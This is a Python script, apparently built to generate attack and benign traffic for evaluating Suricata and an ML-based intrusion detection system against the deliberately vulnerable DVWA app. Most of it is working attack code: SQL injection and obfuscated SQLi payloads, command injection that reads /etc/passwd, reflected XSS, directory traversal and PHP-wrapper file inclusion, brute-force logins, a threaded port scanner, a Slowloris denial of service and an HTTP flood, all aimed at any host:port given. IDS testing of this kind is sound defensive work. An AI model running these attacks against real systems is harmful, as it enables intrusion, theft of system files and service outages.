#!/usr/bin/env python3

import requests
import socket
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

class ComprehensiveAttackSuite:
    def __init__(self, targets=None):
        # Support multiple targets with format "host:port"
        if targets is None:
            targets = ["localhost:80"]
        if isinstance(targets, str):
            targets = [targets]
        
        # Parse targets into list of (host, port) tuples
        self.targets = []
        for target in targets:
            if ':' in target:
                host, port = target.rsplit(':', 1)
                self.targets.append((host, int(port)))
            else:
                self.targets.append((target, 80))
        
        self.sessions = {}
        self.results = {}
        
        # Login to DVWA on all targets
        for host, port in self.targets:
            key = f"{host}:{port}"
            self.login_dvwa(host, port, key)
    
    def login_dvwa(self, host, port, key):
        """Login to DVWA and get session cookie"""
        print(f"[*] Logging into DVWA on {key}...")
        try:
            session = requests.Session()
            base_url = f"http://{host}:{port}/dvwa"
            
            # Get login page to obtain CSRF token
            response = session.get(f"{base_url}/login.php")
            
            # Login with default credentials
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login'
            }
            response = session.post(f"{base_url}/login.php", data=login_data)
            
            # Set security level to low
            session.get(f"{base_url}/security.php?security=low")
            
            self.sessions[key] = session
            print(f"[+] Successfully logged into DVWA on {key}\n")
        except Exception as e:
            print(f"[!] Error logging in to {key}: {e}")
    
    def make_request_all_targets(self, path, method='GET', **kwargs):
        """Make request to all targets simultaneously"""
        results = {}
        for host, port in self.targets:
            key = f"{host}:{port}"
            try:
                base_url = f"http://{host}:{port}/dvwa"
                url = f"{base_url}{path}"
                session = self.sessions.get(key)
                if session is None:
                    continue
                
                if method == 'GET':
                    response = session.get(url, **kwargs)
                else:
                    response = session.post(url, **kwargs)
                
                results[key] = response
            except Exception as e:
                results[key] = None
        return results
    
    # ========================================
    # TEST 1: SQL Injection Attacks
    # ========================================
    
    def test_basic_sqli(self):
        """Basic SQL Injection"""
        print("\n" + "="*70)
        print("TEST 1A: BASIC SQL INJECTION ATTACKS")
        print("="*70)
        
        attacks = [
            ("UNION SELECT", "1' UNION SELECT null,user() #"),
            ("OR 1=1 bypass", "1' OR '1'='1"),
            ("Boolean-based blind", "1' AND '1'='1"),
            ("Comment injection", "1' --"),
            ("Information schema", "1' UNION SELECT null,table_name FROM information_schema.tables #"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            print(f"  Testing: {label}")
            responses = self.make_request_all_targets(
                f"/vulnerabilities/sqli/?id={payload}&Submit=Submit",
                timeout=5
            )
            
            for target_ip, response in responses.items():
                if response and response.status_code == 200:
                    success_count += 1
                    print(f"    [{target_ip}] Payload delivered")
                elif response:
                    print(f"    [{target_ip}] Failed ({response.status_code})")
                else:
                    print(f"    [{target_ip}] Error occurred")
            
            time.sleep(0.5)
        
        self.results['basic_sqli'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
        print(f"\nBasic SQLi: {success_count}/{len(attacks) * len(self.targets)} successful")
    
    def test_obfuscated_sqli(self):
        """Obfuscated SQL Injection"""
        print("\n" + "="*70)
        print("TEST 1B: OBFUSCATED SQL INJECTION ATTACKS")
        print("="*70)
        
        attacks = [
            ("URL encoded UNION", "1%27%20UNION%20SELECT%20null,user()%20%23"),
            ("Whitespace obfuscation", "1'    UNION    SELECT    null,user() #"),
            ("Comment obfuscation", "1'/**/UNION/**/SELECT/**/null,user() #"),
            ("Mixed case", "1' uNiOn SeLeCt null,user() #"),
            ("Hex encoding", "1' UNION SELECT 0x61646d696e,user() #"),
            ("Double encoding", "1%2527%2520UNION%2520SELECT%2520null,user()%2520%2523"),
            ("Null byte injection", "1'%00 UNION SELECT null,user() #"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            print(f"  Testing: {label}")
            responses = self.make_request_all_targets(
                f"/vulnerabilities/sqli/?id={payload}&Submit=Submit",
                timeout=5
            )
            
            for target_ip, response in responses.items():
                if response and response.status_code == 200:
                    success_count += 1
                    print(f"    [{target_ip}] Payload delivered")
                elif response:
                    print(f"    [{target_ip}] Failed ({response.status_code})")
                else:
                    print(f"    [{target_ip}] Error occurred")
            
            time.sleep(0.5)
        
        self.results['obfuscated_sqli'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
        print(f"\nObfuscated SQLi: {success_count}/{len(attacks) * len(self.targets)} successful")
    
    # ========================================
    # TEST 2: Command Injection Attacks
    # ========================================
    
    def test_command_injection(self):
        """Command Injection"""
        print("\n" + "="*70)
        print("TEST 2: COMMAND INJECTION ATTACKS")
        print("="*70)
        
        attacks = [
            ("Semicolon separator", "127.0.0.1; ls -la"),
            ("Pipe separator", "127.0.0.1 | whoami"),
            ("AND operator", "127.0.0.1 && cat /etc/passwd"),
            ("OR operator", "127.0.0.1 || id"),
            ("Command substitution", "127.0.0.1; echo $(whoami)"),
            ("Backtick execution", "127.0.0.1; `whoami`"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            print(f"  Testing: {label}")
            responses = self.make_request_all_targets(
                f"/vulnerabilities/exec/?ip={quote(payload)}&Submit=Submit",
                timeout=5
            )
            
            for target_ip, response in responses.items():
                if response and response.status_code == 200:
                    success_count += 1
                    print(f"    [{target_ip}] Payload delivered")
                elif response:
                    print(f"    [{target_ip}] Failed ({response.status_code})")
                else:
                    print(f"    [{target_ip}] Error occurred")
            
            time.sleep(0.5)
        
        self.results['command_injection'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
        print(f"\nCommand Injection: {success_count}/{len(attacks) * len(self.targets)} successful")
    
    # ========================================
    # TEST 3: Port Scan Attack
    # ========================================
    
    def test_port_scan(self):
        """Port Scan"""
        print("\n" + "="*70)
        print("TEST 3: PORT SCAN ATTACK")
        print("="*70)
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            print(f"[*] Scanning {key} ports 1-1100...")
            
            def scan_port(scan_port_num):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    result = sock.connect_ex((host, scan_port_num))
                    sock.close()
                    return scan_port_num, result == 0
                except:
                    return scan_port_num, False
            
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=100) as executor:
                results = list(executor.map(scan_port, range(1, 1101)))
            
            elapsed = time.time() - start_time
            open_ports = [p for p, is_open in results if is_open]
            
            print(f"  [{key}] ✓ Scanned 1100 ports in {elapsed:.2f}s")
            print(f"  [{key}] Found {len(open_ports)} open ports")
        
        self.results['port_scan'] = {'total': 1100 * len(self.targets), 'time': elapsed}
    
    # ========================================
    # TEST 4: Brute Force Attack
    # ========================================
    
    def test_brute_force(self):
        """Brute Force"""
        print("\n" + "="*70)
        print("TEST 4: BRUTE FORCE ATTACK")
        print("="*70)
        
        success_count = 0
        for host, port in self.targets:
            key = f"{host}:{port}"
            print(f"[*] [{key}] Attempting 30 rapid login attempts...")
            base_url = f"http://{host}:{port}/dvwa"
            session = self.sessions.get(key)
            
            for i in range(30):
                try:
                    login_data = {
                        'username': f'admin{i}',
                        'password': f'password{i}',
                        'Login': 'Login'
                    }
                    response = session.post(f"{base_url}/vulnerabilities/brute/", data=login_data, timeout=5)
                    
                    if response.status_code == 200:
                        success_count += 1
                    
                    print(f"  Attempt {i+1}/30", end='\r')
                    time.sleep(0.2)
                except:
                    pass
            
            print(f"\n  [{key}] Completed 30 attempts")
        
        self.results['brute_force'] = {'total': 30 * len(self.targets), 'success': success_count}
    
    # ========================================
    # TEST 5: XSS Attack
    # ========================================
    
    def test_xss(self):
        """Cross-Site Scripting"""
        print("\n" + "="*70)
        print("TEST 5: XSS ATTACKS")
        print("="*70)
        
        attacks = [
            ("Basic script tag", "<script>alert('XSS')</script>"),
            ("IMG onerror", "<img src=x onerror=alert('XSS')>"),
            ("Event handler", "<body onload=alert('XSS')>"),
            ("JavaScript protocol", "<a href='javascript:alert(\"XSS\")'>Click</a>"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            print(f"  Testing: {label}")
            responses = self.make_request_all_targets(
                f"/vulnerabilities/xss_r/?name={quote(payload)}",
                timeout=5
            )
            
            for target_ip, response in responses.items():
                if response and response.status_code == 200:
                    success_count += 1
                    print(f"    [{target_ip}] Payload delivered")
                elif response:
                    print(f"    [{target_ip}] Failed ({response.status_code})")
                else:
                    print(f"    [{target_ip}] Error occurred")
            
            time.sleep(0.5)
        
        self.results['xss'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
        print(f"\nXSS: {success_count}/{len(attacks) * len(self.targets)} successful")
    
    # ========================================
    # TEST 6: File Inclusion Attack
    # ========================================
    
    def test_file_inclusion(self):
        """File Inclusion"""
        print("\n" + "="*70)
        print("TEST 6: FILE INCLUSION ATTACKS")
        print("="*70)
        
        attacks = [
            ("Directory traversal", "../../../../../../etc/passwd"),
            ("Null byte", "../../../../../../etc/passwd%00"),
            ("PHP wrapper", "php://filter/convert.base64-encode/resource=index.php"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            print(f"  Testing: {label}")
            responses = self.make_request_all_targets(
                f"/vulnerabilities/fi/?page={quote(payload)}",
                timeout=5
            )
            
            for target_ip, response in responses.items():
                if response and response.status_code == 200:
                    success_count += 1
                    print(f"    [{target_ip}] Payload delivered")
                elif response:
                    print(f"    [{target_ip}] Failed ({response.status_code})")
                else:
                    print(f"    [{target_ip}] Error occurred")
            
            time.sleep(0.5)
        
        self.results['file_inclusion'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
        print(f"\nFile Inclusion: {success_count}/{len(attacks) * len(self.targets)} successful")
    
    # ========================================
    # TEST 7: Slowloris DoS Attack
    # ========================================
    
    def test_slowloris(self):
        """Slowloris DoS"""
        print("\n" + "="*70)
        print("TEST 7: SLOWLORIS DoS ATTACK")
        print("="*70)
        
        total_sockets = 0
        for host, port in self.targets:
            key = f"{host}:{port}"
            print(f"[*] [{key}] Creating slow HTTP connections...")
            
            sockets = []
            for i in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((host, port))
                    sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
                    sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                    sock.send("Accept-language: en-US,en\r\n".encode())
                    sockets.append(sock)
                except:
                    pass
            
            print(f"  [{key}] Created {len(sockets)} slow connections")
            
            # Keep connections alive with incomplete headers
            print(f"[*] [{key}] Keeping connections alive with slow headers...")
            for _ in range(10):
                for sock in sockets:
                    try:
                        sock.send(f"X-a: {time.time()}\r\n".encode())
                    except:
                        pass
                time.sleep(0.5)
            
            # Cleanup
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            print(f"  [{key}] Slowloris attack completed")
            total_sockets += len(sockets)
        
        self.results['slowloris'] = {'sockets': total_sockets}
    
    # ========================================
    # TEST 8: HTTP Flood Attack
    # ========================================
    
    def test_http_flood(self):
        """HTTP Flood"""
        print("\n" + "="*70)
        print("TEST 8: HTTP FLOOD ATTACK")
        print("="*70)
        
        total_success = 0
        total_time = 0
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            print(f"[*] [{key}] Sending 200 rapid HTTP requests...")
            base_url = f"http://{host}:{port}/dvwa"
            
            def make_request(_):
                try:
                    requests.get(f"{base_url}/", timeout=2)
                    return True
                except:
                    return False
            
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = list(executor.map(make_request, range(200)))
            
            elapsed = time.time() - start_time
            success = sum(1 for r in results if r)
            
            print(f"  [{key}] Sent {success}/200 requests in {elapsed:.2f}s")
            print(f"  [{key}] Rate: {success/elapsed:.2f} req/s")
            
            total_success += success
            total_time += elapsed
        
        self.results['http_flood'] = {'total': 200 * len(self.targets), 'success': total_success, 'time': total_time}
    
    # ========================================
    # Benign Traffic Tests
    # ========================================
    
    def test_benign_browsing(self):
        """Test 9: Benign browsing - normal legitimate page access"""
        print("\n" + "="*70)
        print("TEST 9: Benign Browsing Activity")
        print("="*70)
        
        pages = ["/", "/about.php", "/instructions.php", "/security.php", "/phpinfo.php"]
        
        print("[*] Simulating normal user browsing...")
        successful = 0
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            base_url = f"http://{host}:{port}/dvwa"
            session = self.sessions.get(key)
            print(f"  [{key}] Browsing pages...")
            
            for page in pages:
                try:
                    response = session.get(f"{base_url}{page}", timeout=3)
                    if response.status_code == 200:
                        successful += 1
                        print(f"    Browsed: {page}")
                    time.sleep(1)  # Normal user behavior
                except:
                    pass
        
        print(f"  Completed {successful}/{len(pages) * len(self.targets)} page views")
        self.results['benign_browsing'] = {'total': len(pages) * len(self.targets), 'success': successful}

    def test_benign_login(self):
        """Test 10: Benign login - normal authentication attempts"""
        print("\n" + "="*70)
        print("TEST 10: Benign Login Activity")
        print("="*70)
        
        credentials = [
            ('admin', 'password'),  # correct
            ('user', 'user123'),    # trying different account
        ]
        
        print("[*] Performing normal login attempts...")
        successful = 0
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            base_url = f"http://{host}:{port}/dvwa"
            session = self.sessions.get(key)
            login_url = f"{base_url}/login.php"
            print(f"  [{key}] Attempting logins...")
            
            for username, password in credentials:
                try:
                    response = session.post(
                        login_url,
                        data={'username': username, 'password': password, 'Login': 'Login'},
                        timeout=3
                    )
                    successful += 1
                    print(f"    ✓ Login attempt: {username}")
                    time.sleep(3)  # Normal delay between attempts
                except:
                    pass
        
        print(f"  Completed {successful}/{len(credentials) * len(self.targets)} login attempts")
        self.results['benign_login'] = {'total': len(credentials) * len(self.targets), 'success': successful}

    def test_benign_search(self):
        """Test 11: Benign search - legitimate search queries"""
        print("\n" + "="*70)
        print("TEST 11: Benign Search Activity")
        print("="*70)
        
        search_queries = [
            "documentation",
            "help guide",
            "tutorial",
            "user manual",
        ]
        
        print("[*] Performing legitimate searches...")
        successful = 0
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            base_url = f"http://{host}:{port}/dvwa"
            session = self.sessions.get(key)
            print(f"  [{key}] Searching...")
            
            for query in search_queries:
                try:
                    search_url = f"{base_url}/vulnerabilities/xss_r/?name={requests.utils.quote(query)}"
                    response = session.get(search_url, timeout=3)
                    if response.status_code == 200:
                        successful += 1
                        print(f"    Searched: '{query}'")
                    time.sleep(1)
                except:
                    pass
        
        print(f"  Completed {successful}/{len(search_queries) * len(self.targets)} searches")
        self.results['benign_search'] = {'total': len(search_queries) * len(self.targets), 'success': successful}

    def test_benign_file_access(self):
        """Test 12: Benign file access - normal resource loading"""
        print("\n" + "="*70)
        print("TEST 12: Benign File Access")
        print("="*70)
        
        file_paths = [
            "/dvwa/css/main.css",
            "/dvwa/images/logo.png",
            "/favicon.ico",
        ]
        
        print("[*] Accessing normal static resources...")
        successful = 0
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            base_url = f"http://{host}:{port}"
            session = self.sessions.get(key)
            print(f"  [{key}] Loading resources...")
            
            for path in file_paths:
                try:
                    response = session.get(f"{base_url}{path}", timeout=3)
                    if response.status_code in [200, 304]:
                        successful += 1
                        print(f"    ✓ Loaded: {path.split('/')[-1]}")
                    time.sleep(0.5)
                except:
                    pass
        
        print(f"  Completed {successful}/{len(file_paths) * len(self.targets)} file accesses")
        self.results['benign_file_access'] = {'total': len(file_paths) * len(self.targets), 'success': successful}

    def test_benign_api_calls(self):
        """Test 13: Benign API calls - legitimate data requests"""
        print("\n" + "="*70)
        print("TEST 13: Benign API Activity")
        print("="*70)
        
        api_paths = [
            "/security.php",
            "/setup.php",
            "/vulnerabilities/captcha/",
        ]
        
        print("[*] Making legitimate API calls...")
        successful = 0
        
        for host, port in self.targets:
            key = f"{host}:{port}"
            base_url = f"http://{host}:{port}/dvwa"
            session = self.sessions.get(key)
            print(f"  [{key}] Making API calls...")
            
            for path in api_paths:
                try:
                    response = session.get(f"{base_url}{path}", timeout=3)
                    if response.status_code in [200, 302]:
                        successful += 1
                        print(f"    API call: {path.split('/')[-2] if path.endswith('/') else path.split('/')[-1]}")
                    time.sleep(1)
                except:
                    pass
        
        print(f"  Completed {successful}/{len(api_paths) * len(self.targets)} API calls")
        self.results['benign_api_calls'] = {'total': len(api_paths) * len(self.targets), 'success': successful}
    
    # ========================================
    # Main Execution
    # ========================================
    
    def print_summary(self):
        """Print attack summary"""
        print("\n" + "="*70)
        print("ATTACK SUITE SUMMARY")
        print("="*70)
        
        # Separate malicious and benign tests
        malicious_tests = ['basic_sqli', 'obfuscated_sqli', 'command_injection', 
                          'port_scan', 'brute_force', 'xss', 'file_inclusion', 
                          'slowloris', 'http_flood']
        benign_tests = ['benign_browsing', 'benign_login', 'benign_search', 
                       'benign_file_access', 'benign_api_calls']
        
        print("\n MALICIOUS TRAFFIC:")
        for test in malicious_tests:
            if test in self.results:
                data = self.results[test]
                print(f"  {test.replace('_', ' ').title()}: {data}")
        
        print("\n BENIGN TRAFFIC:")
        for test in benign_tests:
            if test in self.results:
                data = self.results[test]
                print(f"  {test.replace('_', ' ').title()}: {data}")
        
        print("\n" + "="*70)
        print("ATTACK SUIT COMPLETED")
        print("="*70)
        print("\n")
    
    def run_all_attacks(self):
        """Execute all attack tests with mixed benign traffic"""
        print("\n" + "="*70)
        print("COMPREHENSIVE ATTACK SUITE WITH BENIGN TRAFFIC")
        print(f"Targets: {', '.join([f'{h}:{p}' for h, p in self.targets])}")
        print("="*70)
        
        # Mix malicious and benign traffic for realistic testing
        print("\n🎯 PHASE 1: Malicious Attacks")
        self.test_basic_sqli()
        time.sleep(2)
        
        # Benign traffic between attacks
        self.test_benign_browsing()
        time.sleep(2)
        
        self.test_obfuscated_sqli()
        time.sleep(2)
        
        self.test_benign_login()
        time.sleep(2)
        
        self.test_command_injection()
        time.sleep(2)
        
        self.test_benign_search()
        time.sleep(2)
        
        self.test_port_scan()
        time.sleep(2)
        
        self.test_benign_file_access()
        time.sleep(2)
        
        self.test_brute_force()
        time.sleep(2)
        
        self.test_xss()
        time.sleep(2)
        
        self.test_benign_api_calls()
        time.sleep(2)
        
        self.test_file_inclusion()
        time.sleep(2)
        
        print("\n🎯 PHASE 2: DoS Attacks")
        self.test_slowloris()
        time.sleep(2)
        
        self.test_http_flood()
        
        # Print summary
        self.print_summary()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 attack_suite.py <target1> [target2] ...")
        print("Target format: host:port")
        print("Example (single): python3 attack_suite.py localhost:8081")
        print("Example (dual IDS): python3 attack_suite.py localhost:8081 localhost:8082")
        print("This will attack both Suricata (8081) and ML-IDS (8082) simultaneously")
        sys.exit(1)
    
    # Get all target arguments (skip script name)
    targets = sys.argv[1:]
    
    attacker = ComprehensiveAttackSuite(targets)
    attacker.run_all_attacks()